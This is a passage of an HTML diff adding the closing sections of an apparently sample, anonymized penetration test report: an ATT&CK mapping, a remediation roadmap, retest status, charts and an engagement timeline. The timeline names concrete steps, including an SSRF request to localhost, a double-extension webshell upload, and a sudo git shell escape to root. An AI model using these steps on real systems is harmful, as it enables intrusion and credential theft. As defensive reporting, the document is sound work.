+  <div class="mitre-grid">
+    <div class="mitre-phase">
+      <div class="mitre-phase-header">Reconnaissance</div>
+      <div class="mitre-phase-item"><span class="tid">T1595.001</span>Port / Service Scanning (nmap)</div>
+      <div class="mitre-phase-item"><span class="tid">T1592</span>Gather Host Info (nikto, gobuster)</div>
+    </div>
+    <div class="mitre-phase">
+      <div class="mitre-phase-header">Initial Access</div>
+      <div class="mitre-phase-item"><span class="tid">T1190</span>Exploit Public-Facing Application &mdash; SSRF on /api/fetch</div>
+    </div>
+    <div class="mitre-phase">
+      <div class="mitre-phase-header">Execution</div>
+      <div class="mitre-phase-item"><span class="tid">T1059</span>Command &amp; Scripting Interpreter &mdash; PHP webshell</div>
+      <div class="mitre-phase-item"><span class="tid">T1059.007</span>JavaScript &mdash; Reflected XSS</div>
+    </div>
+    <div class="mitre-phase">
+      <div class="mitre-phase-header">Persistence</div>
+      <div class="mitre-phase-item"><span class="tid">T1505.003</span>Server Software Component &mdash; Web Shell in /uploads/</div>
+    </div>
+    <div class="mitre-phase">
+      <div class="mitre-phase-header">Privilege Escalation</div>
+      <div class="mitre-phase-item"><span class="tid">T1548.003</span>Sudo and Sudo Caching &mdash; NOPASSWD git GTFOBins</div>
+    </div>
+    <div class="mitre-phase">
+      <div class="mitre-phase-header">Credential Access</div>
+      <div class="mitre-phase-item"><span class="tid">T1003</span>OS Credential Dumping &mdash; /root/.ssh/id_rsa + config.php</div>
+      <div class="mitre-phase-item"><span class="tid">T1552.001</span>Credentials in Files &mdash; DB creds in config.php</div>
+    </div>
+    <div class="mitre-phase">
+      <div class="mitre-phase-header">Discovery</div>
+      <div class="mitre-phase-item"><span class="tid">T1083</span>File and Directory Discovery (LinPEAS, ls, find)</div>
+      <div class="mitre-phase-item"><span class="tid">T1057</span>Process Discovery (ps, id, whoami)</div>
+    </div>
+    <div class="mitre-phase">
+      <div class="mitre-phase-header">Collection / Exfil</div>
+      <div class="mitre-phase-item"><span class="tid">T1005</span>Data from Local System &mdash; root.txt, user.txt, id_rsa</div>
+      <div class="mitre-phase-item"><span class="tid">T1041</span>Exfiltration Over C2 &mdash; artifacts returned via webshell HTTP</div>
+    </div>
+  </div>
+</section>
+
+<!-- SECTION 13: REMEDIATION ROADMAP -->
+<section id="remediation">
+  <div class="section-eyebrow"><span class="num">&sect;13</span> Remediation</div>
+  <h2 class="section-title">Remediation <span class="accent">Roadmap</span></h2>
+  <div class="section-divider"></div>
+  <div class="roadmap-grid">
+    <div class="roadmap-card p1">
+      <div class="roadmap-priority">P1 &mdash; NOW (0&ndash;7 days)</div>
+      <ul class="roadmap-items">
+        <li>Implement strict egress allow-list on /api/fetch; block all RFC-1918 + loopback targets</li>
+        <li>Enforce upload validation: MIME type + magic-byte inspection; reject double extensions</li>
+        <li>Move uploads off web root to noexec mount; block PHP execution in uploads dir</li>
+        <li>Remove <code style="font-family:var(--font-mono);font-size:10px">NOPASSWD: /usr/bin/git</code> from sudoers immediately</li>
+        <li>Rotate /root/.ssh/id_rsa (revoke &amp; regenerate key pair)</li>
+        <li>Rotate DB credentials in config.php; rotate APP_SECRET</li>
+        <li>Remove / quarantine the deployed webshell from /uploads/</li>
+      </ul>
+    </div>
+    <div class="roadmap-card p2">
+      <div class="roadmap-priority">P2 &mdash; SHORT TERM (7&ndash;30 days)</div>
+      <ul class="roadmap-items">
+        <li>Patch Apache to 2.4.62 or latest stable release</li>
+        <li>Add CSP, HSTS, X-Frame-Options, X-Content-Type-Options headers</li>
+        <li>Disable HTTP TRACE method (TraceEnable Off)</li>
+        <li>HTML-encode user input on /search output (fix reflected XSS)</li>
+        <li>Audit all sudo rules against GTFOBins list; apply least-privilege</li>
+        <li>Deploy FIM on web root directories</li>
+        <li>Configure auditd rules for sudo invocation by www-data</li>
+      </ul>
+    </div>
+    <div class="roadmap-card p3">
+      <div class="roadmap-priority">P3 &mdash; MEDIUM TERM (30&ndash;90 days)</div>
+      <ul class="roadmap-items">
+        <li>Disable TLS 1.0 and TLS 1.1; enforce TLS 1.2 / 1.3 only</li>
+        <li>Suppress verbose server/version banners (ServerTokens Prod)</li>
+        <li>Onboard EDR with process-tree visibility for web server process</li>
+        <li>Replace Werkzeug dev server with production WSGI (gunicorn/uWSGI)</li>
+        <li>Implement security-headers.io grade A configuration</li>
+        <li>Purple-team exercise to validate detection coverage post-fix</li>
+        <li>Schedule quarterly penetration testing cadence</li>
+      </ul>
+    </div>
+  </div>
+
+  <!-- Retest Status Table -->
+  <h3 style="font-size:16px;font-weight:700;color:var(--text-primary);margin:36px 0 16px">Retest &amp; Verification Status</h3>
+  <div class="table-wrap">
+    <table>
+      <thead>
+        <tr><th>ID</th><th>Finding</th><th>Severity</th><th>Retest Date</th><th>Status</th><th>Notes</th></tr>
+      </thead>
+      <tbody>
+        <tr><td><span class="finding-id">F-01</span></td><td style="font-size:12px">SSRF to internal admin</td><td><span class="sev critical">Critical</span></td><td class="mono">19 Jun 2026</td><td><span class="status verified">Re-confirmed</span></td><td style="font-size:11px;color:var(--text-muted)">Still exploitable; no fix applied at retest time</td></tr>
+        <tr><td><span class="finding-id">F-02</span></td><td style="font-size:12px">File upload &rarr; RCE</td><td><span class="sev critical">Critical</span></td><td class="mono">19 Jun 2026</td><td><span class="status verified">Re-confirmed</span></td><td style="font-size:11px;color:var(--text-muted)">Webshell still accessible; double-ext bypass still works</td></tr>
+        <tr><td><span class="finding-id">F-03</span></td><td style="font-size:12px">Sudo git GTFOBins</td><td><span class="sev high">High</span></td><td class="mono">19 Jun 2026</td><td><span class="status verified">Re-confirmed</span></td><td style="font-size:11px;color:var(--text-muted)">Sudo rule unchanged; privesc to root re-confirmed</td></tr>
+        <tr><td><span class="finding-id">F-04</span></td><td style="font-size:12px">Outdated Apache</td><td><span class="sev high">High</span></td><td class="mono">&mdash;</td><td><span class="status open">Open</span></td><td style="font-size:11px;color:var(--text-muted)">Not retested; version banner unchanged</td></tr>
+        <tr><td><span class="finding-id">F-05</span></td><td style="font-size:12px">Reflected XSS /search</td><td><span class="sev medium">Medium</span></td><td class="mono">19 Jun 2026</td><td><span class="status verified">Re-confirmed</span></td><td style="font-size:11px;color:var(--text-muted)">XSS payload still reflects unencoded</td></tr>
+        <tr><td><span class="finding-id">F-06</span></td><td style="font-size:12px">Missing headers</td><td><span class="sev medium">Medium</span></td><td class="mono">&mdash;</td><td><span class="status open">Open</span></td><td style="font-size:11px;color:var(--text-muted)">Pending P2 remediation</td></tr>
+        <tr><td><span class="finding-id">F-07</span></td><td style="font-size:12px">TRACE enabled</td><td><span class="sev medium">Medium</span></td><td class="mono">&mdash;</td><td><span class="status open">Open</span></td><td style="font-size:11px;color:var(--text-muted)">Pending P2 remediation</td></tr>
+        <tr><td><span class="finding-id">F-08</span></td><td style="font-size:12px">TLS 1.0/1.1</td><td><span class="sev low">Low</span></td><td class="mono">&mdash;</td><td><span class="status open">Open</span></td><td style="font-size:11px;color:var(--text-muted)">Pending P3 remediation</td></tr>
+        <tr><td><span class="finding-id">F-09</span></td><td style="font-size:12px">Verbose banners</td><td><span class="sev low">Low</span></td><td class="mono">&mdash;</td><td><span class="status open">Open</span></td><td style="font-size:11px;color:var(--text-muted)">Pending P3 remediation</td></tr>
+      </tbody>
+    </table>
+  </div>
+</section>
+<!-- SECTION 14: CHARTS / DATA-VIZ (pure inline SVG) -->
+<section id="charts">
+  <div class="section-eyebrow"><span class="num">&sect;14</span> Data Visualisation</div>
+  <h2 class="section-title">Severity Distribution &amp; <span class="accent">Outcome Charts</span></h2>
+  <div class="section-divider"></div>
+
+  <div style="display:grid;grid-template-columns:1fr 1fr;gap:24px;margin-bottom:32px">
+
+    <!-- Severity Bar Chart -->
+    <div class="card">
+      <div class="card-header">Severity Distribution (14 findings)</div>
+      <svg viewBox="0 0 320 220" xmlns="http://www.w3.org/2000/svg" style="width:100%">
+        <defs>
+          <filter id="bar-glow"><feGaussianBlur stdDeviation="2" result="b"/><feMerge><feMergeNode in="b"/><feMergeNode in="SourceGraphic"/></feMerge></filter>
+        </defs>
+        <!-- Y axis -->
+        <line x1="48" y1="10" x2="48" y2="175" stroke="#252a38" stroke-width="1"/>
+        <!-- X axis -->
+        <line x1="48" y1="175" x2="310" y2="175" stroke="#252a38" stroke-width="1"/>
+        <!-- Y grid lines -->
+        <line x1="48" y1="130" x2="310" y2="130" stroke="#1e2130" stroke-width="1" stroke-dasharray="3,4"/>
+        <line x1="48" y1="90" x2="310" y2="90" stroke="#1e2130" stroke-width="1" stroke-dasharray="3,4"/>
+        <line x1="48" y1="50" x2="310" y2="50" stroke="#1e2130" stroke-width="1" stroke-dasharray="3,4"/>
+        <!-- Y labels -->
+        <text x="40" y="178" text-anchor="end" fill="#555e78" font-size="10" font-family="JetBrains Mono,monospace">0</text>
+        <text x="40" y="133" text-anchor="end" fill="#555e78" font-size="10" font-family="JetBrains Mono,monospace">1</text>
+        <text x="40" y="93" text-anchor="end" fill="#555e78" font-size="10" font-family="JetBrains Mono,monospace">2</text>
+        <text x="40" y="53" text-anchor="end" fill="#555e78" font-size="10" font-family="JetBrains Mono,monospace">3</text>
+        <!-- Bars: scale = 40px per unit. bars: crit=2, high=3, med=3, low=2, info=4 -->
+        <!-- Critical: 2 units = 80px tall, top at y=95 -->
+        <rect x="62" y="95" width="38" height="80" rx="3" fill="#ff3b5c" opacity="0.85" filter="url(#bar-glow)"/>
+        <text x="81" y="91" text-anchor="middle" fill="#ff3b5c" font-size="11" font-family="JetBrains Mono,monospace" font-weight="700">2</text>
+        <text x="81" y="192" text-anchor="middle" fill="#8b92a8" font-size="9" font-family="JetBrains Mono,monospace">Critical</text>
+        <!-- High: 3 units = 120px tall, top at y=55 -->
+        <rect x="112" y="55" width="38" height="120" rx="3" fill="#ff6b2b" opacity="0.85" filter="url(#bar-glow)"/>
+        <text x="131" y="51" text-anchor="middle" fill="#ff6b2b" font-size="11" font-family="JetBrains Mono,monospace" font-weight="700">3</text>
+        <text x="131" y="192" text-anchor="middle" fill="#8b92a8" font-size="9" font-family="JetBrains Mono,monospace">High</text>
+        <!-- Medium: 3 units = 120px tall, top at y=55 -->
+        <rect x="162" y="55" width="38" height="120" rx="3" fill="#f59e0b" opacity="0.85" filter="url(#bar-glow)"/>
+        <text x="181" y="51" text-anchor="middle" fill="#f59e0b" font-size="11" font-family="JetBrains Mono,monospace" font-weight="700">3</text>
+        <text x="181" y="192" text-anchor="middle" fill="#8b92a8" font-size="9" font-family="JetBrains Mono,monospace">Medium</text>
+        <!-- Low: 2 units = 80px tall, top at y=95 -->
+        <rect x="212" y="95" width="38" height="80" rx="3" fill="#3b82f6" opacity="0.85" filter="url(#bar-glow)"/>
+        <text x="231" y="91" text-anchor="middle" fill="#3b82f6" font-size="11" font-family="JetBrains Mono,monospace" font-weight="700">2</text>
+        <text x="231" y="192" text-anchor="middle" fill="#8b92a8" font-size="9" font-family="JetBrains Mono,monospace">Low</text>
+        <!-- Info: 4 units = 160px tall, top at y=15 -->
+        <rect x="262" y="15" width="38" height="160" rx="3" fill="#6b7280" opacity="0.7"/>
+        <text x="281" y="11" text-anchor="middle" fill="#9ca3af" font-size="11" font-family="JetBrains Mono,monospace" font-weight="700">4</text>
+        <text x="281" y="192" text-anchor="middle" fill="#8b92a8" font-size="9" font-family="JetBrains Mono,monospace">Info</text>
+        <!-- Chart title -->
+        <text x="179" y="210" text-anchor="middle" fill="#555e78" font-size="9" font-family="JetBrains Mono,monospace">Findings by Severity Band</text>
+      </svg>
+    </div>
+
+    <!-- Attack Outcome Donut -->
+    <div class="card">
+      <div class="card-header">Attack Attempt Outcomes (14 tests)</div>
+      <svg viewBox="0 0 320 220" xmlns="http://www.w3.org/2000/svg" style="width:100%">
+        <!-- Donut chart: 7 exploitable, 4 non-exploitable, 3 recon-only -->
+        <!-- Total = 14. Angles: exploit=7/14=180deg, non-exploit=4/14~102.9deg, recon=3/14~77.1deg -->
+        <!-- Donut centered at 130,110 radius 80, inner 48 -->
+        <!-- Segment 1: Exploitable 7/14 = 180deg, start=270deg (top), end=90deg (clockwise) -->
+        <!-- Using path arc: start at top (130, 30), sweep 180deg CW to (130, 190) -->
+        <path d="M 130 30 A 80 80 0 0 1 130 190 L 130 158 A 48 48 0 0 0 130 62 Z" fill="#ff3b5c" opacity="0.9"/>
+        <!-- Segment 2: Non-exploit 4/14 ~102.9deg, from 90deg (bottom-right sweep) -->
+        <!-- 90deg on circle(130,110,80): x=130+80cos(90°)=130+0=130, y=110+80sin(90°)=190 wait using standard svg coords -->
+        <!-- Let me use pre-calc: start=90deg=bottom=(130,190), sweep ~103deg CW -->
+        <!-- end angle = 90+102.9=192.9deg => x=130+80cos(192.9)=130-77.9=-47.9+130=52.1, y=110+80sin(192.9)=110-17.9=92.1 -->
+        <path d="M 130 190 A 80 80 0 0 1 52 93 L 69 99 A 48 48 0 0 0 130 158 Z" fill="#6b7280" opacity="0.85"/>
+        <!-- Segment 3: Recon 3/14 ~77.1deg, from 192.9 to 270 (top) -->
+        <!-- 192.9deg => (52,93), 270deg => (130,30) -->
+        <path d="M 52 93 A 80 80 0 0 1 130 30 L 130 62 A 48 48 0 0 0 69 99 Z" fill="#10b981" opacity="0.85"/>
+        <!-- Center text -->
+        <text x="130" y="106" text-anchor="middle" fill="#e8eaf0" font-size="22" font-weight="700" font-family="JetBrains Mono,monospace">14</text>
+        <text x="130" y="122" text-anchor="middle" fill="#8b92a8" font-size="9" font-family="JetBrains Mono,monospace">TOTAL</text>
+        <!-- Legend -->
+        <rect x="220" y="70" width="10" height="10" rx="2" fill="#ff3b5c"/>
+        <text x="235" y="80" fill="#8b92a8" font-size="11" font-family="JetBrains Mono,monospace">Exploitable (7)</text>
+        <rect x="220" y="95" width="10" height="10" rx="2" fill="#6b7280"/>
+        <text x="235" y="105" fill="#8b92a8" font-size="11" font-family="JetBrains Mono,monospace">Not exploit. (4)</text>
+        <rect x="220" y="120" width="10" height="10" rx="2" fill="#10b981"/>
+        <text x="235" y="130" fill="#8b92a8" font-size="11" font-family="JetBrains Mono,monospace">Recon only (3)</text>
+        <!-- Percentages -->
+        <text x="158" y="145" fill="#ff3b5c" font-size="10" font-family="JetBrains Mono,monospace" font-weight="700">50%</text>
+        <text x="70" y="155" fill="#9ca3af" font-size="10" font-family="JetBrains Mono,monospace">29%</text>
+        <text x="80" y="68" fill="#10b981" font-size="10" font-family="JetBrains Mono,monospace">21%</text>
+        <text x="160" y="210" text-anchor="middle" fill="#555e78" font-size="9" font-family="JetBrains Mono,monospace">Attack Attempt Outcome Breakdown</text>
+      </svg>
+    </div>
+  </div>
+
+  <!-- CVSS Score Horizontal Bars -->
+  <div class="card">
+    <div class="card-header">CVSS Scores by Finding</div>
+    <svg viewBox="0 0 720 240" xmlns="http://www.w3.org/2000/svg" style="width:100%">
+      <!-- Findings: F-01:9.1, F-02:9.8, F-03:8.8, F-04:7.5, F-05:6.1, F-06:5.3, F-07:4.8, F-08:3.7, F-09:3.1 -->
+      <!-- max CVSS=10, bar max width = 560px, scale = 56px per unit -->
+      <!-- Row height = 24px, start y=15 -->
+      <defs>
+        <filter id="hbar-glow"><feGaussianBlur stdDeviation="1.5" result="b"/><feMerge><feMergeNode in="b"/><feMergeNode in="SourceGraphic"/></feMerge></filter>
+      </defs>
+      <!-- Y axis -->
+      <line x1="60" y1="0" x2="60" y2="225" stroke="#252a38" stroke-width="1"/>
+      <!-- X grid/labels -->
+      <line x1="60" y1="220" x2="630" y2="220" stroke="#252a38" stroke-width="1"/>
+      <text x="60" y="235" text-anchor="middle" fill="#555e78" font-size="9" font-family="JetBrains Mono,monospace">0</text>
+      <text x="116" y="235" text-anchor="middle" fill="#555e78" font-size="9" font-family="JetBrains Mono,monospace">1</text>
+      <text x="172" y="235" text-anchor="middle" fill="#555e78" font-size="9" font-family="JetBrains Mono,monospace">2</text>
+      <text x="228" y="235" text-anchor="middle" fill="#555e78" font-size="9" font-family="JetBrains Mono,monospace">3</text>
+      <text x="284" y="235" text-anchor="middle" fill="#555e78" font-size="9" font-family="JetBrains Mono,monospace">4</text>
+      <text x="340" y="235" text-anchor="middle" fill="#555e78" font-size="9" font-family="JetBrains Mono,monospace">5</text>
+      <text x="396" y="235" text-anchor="middle" fill="#555e78" font-size="9" font-family="JetBrains Mono,monospace">6</text>
+      <text x="452" y="235" text-anchor="middle" fill="#555e78" font-size="9" font-family="JetBrains Mono,monospace">7</text>
+      <text x="508" y="235" text-anchor="middle" fill="#555e78" font-size="9" font-family="JetBrains Mono,monospace">8</text>
+      <text x="564" y="235" text-anchor="middle" fill="#555e78" font-size="9" font-family="JetBrains Mono,monospace">9</text>
+      <text x="620" y="235" text-anchor="middle" fill="#555e78" font-size="9" font-family="JetBrains Mono,monospace">10</text>
+      <!-- grid verticals -->
+      <line x1="284" y1="0" x2="284" y2="220" stroke="#1e2130" stroke-width="1" stroke-dasharray="2,5"/>
+      <line x1="452" y1="0" x2="452" y2="220" stroke="#1e2130" stroke-width="1" stroke-dasharray="2,5"/>
+      <line x1="508" y1="0" x2="508" y2="220" stroke="#1e2130" stroke-width="1" stroke-dasharray="2,5"/>
+      <line x1="564" y1="0" x2="564" y2="220" stroke="#1e2130" stroke-width="1" stroke-dasharray="2,5"/>
+
+      <!-- F-01: 9.1 => 9.1*56=509.6px -->
+      <text x="55" y="20" text-anchor="end" fill="#00d4ff" font-size="10" font-family="JetBrains Mono,monospace">F-01</text>
+      <rect x="61" y="9" width="509" height="14" rx="2" fill="#ff3b5c" opacity="0.8" filter="url(#hbar-glow)"/>
+      <text x="575" y="20" fill="#ff3b5c" font-size="10" font-family="JetBrains Mono,monospace" font-weight="700">9.1</text>
+      <!-- F-02: 9.8 => 548.8px -->
+      <text x="55" y="44" text-anchor="end" fill="#00d4ff" font-size="10" font-family="JetBrains Mono,monospace">F-02</text>
+      <rect x="61" y="33" width="548" height="14" rx="2" fill="#ff3b5c" opacity="0.9" filter="url(#hbar-glow)"/>
+      <text x="615" y="44" fill="#ff3b5c" font-size="10" font-family="JetBrains Mono,monospace" font-weight="700">9.8</text>
+      <!-- F-03: 8.8 => 492.8px -->
+      <text x="55" y="68" text-anchor="end" fill="#00d4ff" font-size="10" font-family="JetBrains Mono,monospace">F-03</text>
+      <rect x="61" y="57" width="492" height="14" rx="2" fill="#ff6b2b" opacity="0.8" filter="url(#hbar-glow)"/>
+      <text x="558" y="68" fill="#ff6b2b" font-size="10" font-family="JetBrains Mono,monospace" font-weight="700">8.8</text>
+      <!-- F-04: 7.5 => 420px -->
+      <text x="55" y="92" text-anchor="end" fill="#00d4ff" font-size="10" font-family="JetBrains Mono,monospace">F-04</text>
+      <rect x="61" y="81" width="420" height="14" rx="2" fill="#ff6b2b" opacity="0.7"/>
+      <text x="486" y="92" fill="#ff6b2b" font-size="10" font-family="JetBrains Mono,monospace" font-weight="700">7.5</text>
+      <!-- F-05: 6.1 => 341.6px -->
+      <text x="55" y="116" text-anchor="end" fill="#00d4ff" font-size="10" font-family="JetBrains Mono,monospace">F-05</text>
+      <rect x="61" y="105" width="341" height="14" rx="2" fill="#f59e0b" opacity="0.8"/>
+      <text x="407" y="116" fill="#f59e0b" font-size="10" font-family="JetBrains Mono,monospace" font-weight="700">6.1</text>
+      <!-- F-06: 5.3 => 296.8px -->
+      <text x="55" y="140" text-anchor="end" fill="#00d4ff" font-size="10" font-family="JetBrains Mono,monospace">F-06</text>
+      <rect x="61" y="129" width="296" height="14" rx="2" fill="#f59e0b" opacity="0.7"/>
+      <text x="362" y="140" fill="#f59e0b" font-size="10" font-family="JetBrains Mono,monospace" font-weight="700">5.3</text>
+      <!-- F-07: 4.8 => 268.8px -->
+      <text x="55" y="164" text-anchor="end" fill="#00d4ff" font-size="10" font-family="JetBrains Mono,monospace">F-07</text>
+      <rect x="61" y="153" width="268" height="14" rx="2" fill="#f59e0b" opacity="0.6"/>
+      <text x="334" y="164" fill="#f59e0b" font-size="10" font-family="JetBrains Mono,monospace" font-weight="700">4.8</text>
+      <!-- F-08: 3.7 => 207.2px -->
+      <text x="55" y="188" text-anchor="end" fill="#00d4ff" font-size="10" font-family="JetBrains Mono,monospace">F-08</text>
+      <rect x="61" y="177" width="207" height="14" rx="2" fill="#3b82f6" opacity="0.8"/>
+      <text x="273" y="188" fill="#3b82f6" font-size="10" font-family="JetBrains Mono,monospace" font-weight="700">3.7</text>
+      <!-- F-09: 3.1 => 173.6px -->
+      <text x="55" y="212" text-anchor="end" fill="#00d4ff" font-size="10" font-family="JetBrains Mono,monospace">F-09</text>
+      <rect x="61" y="201" width="173" height="14" rx="2" fill="#3b82f6" opacity="0.7"/>
+      <text x="239" y="212" fill="#3b82f6" font-size="10" font-family="JetBrains Mono,monospace" font-weight="700">3.1</text>
+    </svg>
+  </div>
+</section>
+
+<!-- SECTION 15: ENGAGEMENT TIMELINE -->
+<section id="timeline">
+  <div class="section-eyebrow"><span class="num">&sect;15</span> Timeline</div>
+  <h2 class="section-title">Engagement <span class="accent">Timeline</span></h2>
+  <div class="section-divider"></div>
+  <div class="timeline">
+    <div class="timeline-item">
+      <div class="timeline-time">18 Jun 2026 &mdash; 14:02 UTC</div>
+      <div class="timeline-event"><strong>Engagement Start &amp; Reconnaissance</strong> &mdash; nmap -sCV full TCP scan initiated. 3 open ports identified: 22/SSH, 80/Apache, 8080/Werkzeug.</div>
+    </div>
+    <div class="timeline-item">
+      <div class="timeline-time">18 Jun 2026 &mdash; 14:25 UTC</div>
+      <div class="timeline-event"><strong>Web Enumeration</strong> &mdash; gobuster dir scan on :80. /admin (403), /upload, /api, /search discovered. nikto run; Apache 2.4.41 flagged as outdated, TRACE enabled, missing headers.</div>
+    </div>
+    <div class="timeline-item">
+      <div class="timeline-time">18 Jun 2026 &mdash; 14:45 UTC</div>
+      <div class="timeline-event"><strong>Non-exploitable Tests Completed</strong> &mdash; sqlmap on /api?id= (1.2k requests, 5 techniques) returned negative. SSH brute force blocked by rate-limiting. Default cred spray unsuccessful. CSRF tokens validated.</div>
+    </div>
+    <div class="timeline-item">
+      <div class="timeline-time">18 Jun 2026 &mdash; 15:10 UTC</div>
+      <div class="timeline-event"><strong>SSRF Confirmed (F-01)</strong> &mdash; /api/fetch?url=http://127.0.0.1:8080 returned internal admin panel HTML. No allow-list in place. Critical pivot point established. Severity: CRITICAL (CVSS 9.1).</div>
+    </div>
+    <div class="timeline-item">
+      <div class="timeline-time">18 Jun 2026 &mdash; 15:28 UTC</div>
+      <div class="timeline-event"><strong>XSS Found (F-05)</strong> &mdash; /search?q= reflected &lt;script&gt; payload unencoded. Documented; continuing main attack chain.</div>
+    </div>
+    <div class="timeline-item">
+      <div class="timeline-time">18 Jun 2026 &mdash; 15:40 UTC</div>
+      <div class="timeline-event"><strong>Webshell Deployed &amp; RCE Achieved (F-02)</strong> &mdash; shell.php.jpg uploaded via internal admin /upload through SSRF relay. Double-extension + magic-byte bypass succeeded. RCE as www-data confirmed: uid=33(www-data). Foothold established.</div>
+    </div>
+    <div class="timeline-item">
+      <div class="timeline-time">18 Jun 2026 &mdash; 15:52 UTC</div>
+      <div class="timeline-event"><strong>LinPEAS Enumeration</strong> &mdash; LinPEAS.sh executed. Surfaced: sudo NOPASSWD /usr/bin/git. GTFOBins exploitation vector identified.</div>
+    </div>
+    <div class="timeline-item">
+      <div class="timeline-time">18 Jun 2026 &mdash; 16:05 UTC</div>
+      <div class="timeline-event"><strong>Root Achieved (F-03)</strong> &mdash; sudo git -p help config; !/bin/sh executed. uid=0(root) confirmed. Full host compromise. TLS scan completed; 1.0/1.1 flagged (F-08).</div>
+    </div>
+    <div class="timeline-item">
+      <div class="timeline-time">18 Jun 2026 &mdash; 16:20 UTC</div>
+      <div class="timeline-event"><strong>Loot Captured</strong> &mdash; root.txt, user.txt, /root/.ssh/id_rsa, /var/www/app/config.php, /etc/passwd all read and integrity-hashed. All artifacts stored in encrypted evidence store.</div>
+    </div>
+    <div class="timeline-item">
+      <div class="timeline-time">19 Jun 2026 &mdash; 09:00 UTC</div>
+      <div class="timeline-event"><strong>Retest Pass Begin</strong> &mdash; F-01, F-02, F-03, F-05 retested. All four re-confirmed as still exploitable. No remediation had been applied overnight.</div>
+    </div>
+    <div class="timeline-item">
+      <div class="timeline-time">19 Jun 2026 &mdash; 09:30 UTC</div>
+      <div class="timeline-event"><strong>Report Generated</strong> &mdash; ARGUS operator reviewed all findings, validated evidence chain. Report ARG-PT-2026-0619 v1.0 Final issued.</div>
+    </div>
+  </div>
+</section>
+
+<!-- FOOTER -->
+<footer class="report-footer">
+  <div class="footer-brand">&#9632; ARGUS // Autonomous Security Platform</div>
+  <div class="footer-conf">CONFIDENTIAL &mdash; CLIENT PRIVILEGED &mdash; ARG-PT-2026-0619 &mdash; SAMPLE / ANONYMIZED REPORT<br>Not for redistribution. Full evidence available via secure evidence portal under NDA.</div>
+  <div class="footer-ts">Generated: 19 Jun 2026, 09:30 UTC<br>Version: 1.0 Final</div>
+</footer>
+
+</div><!-- end page-wrapper -->
+</body>
+</html>
